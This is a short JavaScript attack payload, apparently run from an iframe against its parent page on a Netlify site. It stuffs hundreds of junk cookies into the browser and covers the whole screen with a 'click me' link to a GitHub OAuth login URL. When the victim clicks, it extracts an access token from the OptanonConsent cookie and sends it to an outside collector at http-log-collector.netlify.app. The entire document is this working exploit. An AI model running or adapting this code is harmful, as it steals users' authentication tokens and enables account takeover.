  // cookie bomb — hits the real jar
  for (var i = 0, prev = -1; i < 400; i++) {
    parent.document.cookie = 'junk' + i + '=' + 'A'.repeat(32) + '; Path=/';
    var v = parent.document.cookie.split(/; */).length;
    if (v === prev) break;
    prev = v;
  }

  // "click me" as a NATIVE LINK — opens the URL with no JS handler, can't die
  var a = parent.document.createElement('a');
  a.href = 'https://api.netlify.com/auth?provider=github&site_id=app.netlify.com&tracking_session_id=afc7d48b-e925-432a-a170-9121236eda09&login=true&entry_point=direct&browser_fingerprint=cbdb5739abc754bdcc16cbd4fb07cd0f&device_fingerprint=bbbac72e6221cf088819fff54ca43b40&redirect=https%3A%2F%2fwww.netlify.com%2F&use_redirect=true';
  a.target = '_blank';
  a.textContent = 'click me';
  a.style.cssText = 'position:fixed;inset:0;width:100vw;height:100vh;background:#fff;color:#000;font-size:48px;cursor:pointer;z-index:2147483647;display:flex;align-items:center;justify-content:center
  ;text-decoration:none';
  parent.document.body.append(a);

  // exfil on ANY click — registered on the PARENT document, so it survives the iframe dying
  var fired = false;
  parent.document.addEventListener('click', function () {
    if (fired) return;
    fired = true;
    setTimeout(function () {
      var t = (parent.document.cookie.match(/OptanonConsent=([^;]*)/) || [])[1] || '';
      t = (t.match(/access_token%3D([^%&]+)/) || [])[1];
      if (t) fetch('https://http-log-collector.netlify.app/api/log?token=' + t);
    }, 10000);
  }, true);
